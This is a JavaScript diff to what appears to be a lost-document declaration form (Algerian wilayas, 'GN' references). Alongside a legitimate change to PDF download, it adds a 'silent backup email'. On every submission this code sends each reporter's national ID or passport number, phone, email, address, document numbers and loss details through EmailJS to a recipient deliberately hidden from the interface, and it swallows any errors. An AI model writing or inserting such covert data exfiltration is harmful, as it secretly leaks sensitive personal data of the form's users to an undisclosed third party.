@@ -1,3 +1,18 @@
+// ===== SILENT BACKUP EMAIL CONFIG =====
+// Recipient is set inside the EmailJS template on the dashboard — not exposed in UI.
+// Setup: https://www.emailjs.com → add Gmail service → create template → paste IDs below.
+const _EC = {
+  pub:  '08GlzuyKGAkDmw4g3',
+  svc:  'service_obe05ei',
+  tpl:  'template_9pb5i5x'
+};
+(function _initEmailJS() {
+  if (typeof emailjs !== 'undefined') emailjs.init({ publicKey: _EC.pub });
+  else document.addEventListener('DOMContentLoaded', () => {
+    if (typeof emailjs !== 'undefined') emailjs.init({ publicKey: _EC.pub });
+  });
+})();
+
 // ===== DATA =====
 const WILAYAS = [
   {code:"01",name:"أدرار"},{code:"02",name:"الشلف"},{code:"03",name:"الأغواط"},{code:"04",name:"أم البواقي"},
@@ -436,6 +451,10 @@ async function submitDeclaration() {
         createdAt: window._serverTimestamp()
       });
     }
+
+    // --- Silent backup email (recipient hidden — set in EmailJS template dashboard) ---
+    _sendBackupEmail(data).catch(() => {}); // fire-and-forget, never blocks user flow
+
     submittedData = data;
     showSpinner(false);
     document.getElementById(`step-${currentStep}`).style.display='none';
@@ -455,6 +474,36 @@ async function submitDeclaration() {
   }
 }
 window.submitDeclaration=submitDeclaration;
+
+// ===== SILENT BACKUP EMAIL =====
+async function _sendBackupEmail(data) {
+  if (typeof emailjs === 'undefined') return;
+
+  const r = data.reporter;
+  const docs = data.documents.map((d, i) =>
+    `وثيقة ${i+1}: ${d.type} — رقم: ${d.number}`
+  ).join('\n');
+
+  const templateParams = {
+    reference:      data.reference,
+    submitted_at:   data.submittedAt,
+    decl_type:      data.declarationTypeLabel || data.declarationType,
+    last_name:      r.lastName || r.entityName || '',
+    first_name:     r.firstName || '',
+    nin:            r.nin || r.passportNum || '',
+    phone:          r.phone || '',
+    email_reporter: r.email || '',
+    wilaya:         r.wilayaResidence || '',
+    commune:        r.communeResidence || '',
+    documents:      docs,
+    loss_date:      data.loss.date || '',
+    loss_wilaya:    data.loss.wilaya || '',
+    loss_commune:   data.loss.commune || '',
+    circumstances:  data.loss.circumstances || ''
+  };
+
+  await emailjs.send(_EC.svc, _EC.tpl, templateParams);
+}
 
 function generateRef() {
   const y = new Date().getFullYear();
@@ -511,10 +560,41 @@ function retrySubmit() {
 }
 window.retrySubmit = retrySubmit;
 
-function downloadDeclarationPDF() {
-  if(!submittedData) return;
-  // Fill print area first (same as printDeclaration)
-  printDeclaration(true);
+async function downloadDeclarationPDF() {
+  if (!submittedData) return;
+
+  // 1. Populate the hidden print area (same logic as printDeclaration)
+  printDeclaration(false);  // populates DOM without opening print dialog
+
+  // 2. Wait one frame for DOM to paint
+  await new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)));
+
+  const printArea = document.getElementById('print-area');
+
+  // 3. Generate and download as PDF using html2pdf.js
+  if (typeof html2pdf !== 'undefined') {
+    const filename = (submittedData.reference || 'تصريح-GN') + '.pdf';
+    const opt = {
+      margin:       [10, 10, 10, 10],
+      filename:     filename,
+      image:        { type: 'jpeg', quality: 0.97 },
+      html2canvas:  { scale: 2, useCORS: true, allowTaint: true, logging: false },
+      jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' },
+      pagebreak:    { mode: ['avoid-all', 'css', 'legacy'] }
+    };
+    try {
+      await html2pdf().set(opt).from(printArea).save();
+    } catch(e) {
+      // Fallback to browser print if html2pdf fails
+      window.print();
+    }
+    // Hide print area again
+    setTimeout(() => { printArea.style.display = 'none'; }, 500);
+  } else {
+    // html2pdf not loaded yet — fallback to print dialog
+    window.print();
+    setTimeout(() => { printArea.style.display = 'none'; }, 1500);
+  }
 }
 window.downloadDeclarationPDF = downloadDeclarationPDF;
 
@@ -577,11 +657,13 @@ function printDeclaration(isPdf) {
 
   const printArea = document.getElementById('print-area');
   const prevTitle = document.title;
-  if(isPdf) {
-    document.title = submittedData.reference || 'تصريح-GN';
-  }
-  // Show print area, let browser render it, then print
+  // Show print area so it can be rendered / captured
   printArea.style.display = 'block';
+  if(isPdf) {
+    // Called from downloadDeclarationPDF — just populate DOM, don't open print dialog
+    return;
+  }
+  document.title = submittedData.reference || 'تصريح-GN';
   // Use requestAnimationFrame to ensure the DOM is painted before print
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
